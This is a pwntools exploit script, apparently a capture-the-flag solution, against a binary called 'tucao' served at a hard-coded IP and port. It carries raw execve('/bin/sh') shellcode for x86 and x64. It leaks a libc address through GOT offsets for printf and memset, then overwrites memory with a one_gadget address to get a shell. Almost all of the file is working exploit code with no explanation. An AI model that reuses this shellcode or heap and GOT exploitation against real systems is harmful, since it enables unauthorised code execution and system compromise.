#!/usr/bin/env python
#coding:utf-8
from pwn import *

#ShellCode Reference
shellcode_x86="\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode_x64="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#shellcode_x85_ascii="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA"

# x86_64: rdi、rsi、rdx、rcx、r8 and r9.
#context.update(arch='i386')
#shellcode = asm(shellcraft.sh())
#context.terminal = ['tmux', 'splitw', '-v']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#frame = SigreturnFrame()

#Settings
context(arch='amd64',os='linux')
local=1
debug=1
is_libc=0

#Ifdebug
if debug == 1:
    context.log_level = 'debug'

#basic affairs
libc_elf = 0
file_elf = 0
filename="./tucao"
libc="./libc-2.23.so"
ip="39.108.52.84"
port=10000
file_elf = ELF(filename)
libc_elf = ELF(libc)
if local == 1:
    if is_libc == 1:
        libc_elf = ELF(libc)
        p = process(filename, env={"LD_PRELOAD":libc})
    else:
        p = process(filename)
else:
    p = remote(ip,port)
prompt = "> "
#Entry
def add(content):
    p.sendlineafter(prompt, '1')
    p.sendlineafter('Input your contents: ', content)
    p.recvuntil('Done!')

def dele(index):
    p.sendlineafter(prompt, '2')
    p.sendlineafter('ID (0-4): ', str(index))
    p.recvuntil('Done!')

def post(index, offset):
    p.sendlineafter(prompt, '3')
    p.sendlineafter('ID (0-4): ', str(index))
    p.sendlineafter(prompt, str(offset))

def quit():
    p.recvuntil(prompt)
    p.sendline("4")
    
add("A" * 248)
post(0,0)
#dele(0)
#payload = p64(0x400d31)
#main = "".join(chr(ord(x) ^ 0xff) for x in payload)

#add(main)
#post(0,0)
#dele(0)
#raw_input()# 0x33c from heap_base is our main.

jmp_base = 0x602090
#leak
#add("a"*8)
offset_printf = (file_elf.got['printf'] - jmp_base) / 8
offset_memset = (file_elf.got['memset'] - jmp_base) / 8

#raw_input("halt:")
#post(0,offset_memset)
#raw_input()
#raw_input()
#post(0,offset_printf)
#leak = p.recvuntil("Done!").split("\n")[0].split("\x40")[1]
#t = "\x40" + leak
#lener = 8 - len(t)
#leak = t + lener * "\x00"
#print len(leak)
#heap = u64 (leak)
#heap_base = heap - 0x240

#heapBase = u64(p.recvuntil('Done!')) -0x168

#print "heapBase: " + hex(heapBase)

#leak heap.
#dele(0)
add("a"*104)
post(0,offset_memset)
#raw_input()
post(0,offset_printf)
leak = p.recvuntil("Done!")
libc_base = leak.split("\n")[0][-6:] + "\x00"*2
libc = u64(libc_base) - 0x3c5540
print hex(libc)


gets = libc + libc_elf.symbols['gets']
system = libc + libc_elf.symbols['system']
onegadget = libc + 0x4526a

print "libc: " + hex(libc)
#print "heap: " + hex(heap_base)
#raw_input()
dele(1)
dele(0)
add("a"*33 + p64(onegadget))
add("b"*255)
add("c"*255)
add("d"*255)
add("e"*255)
raw_input()
post(4,-11)
post(1,1)
post(0,1)
quit()



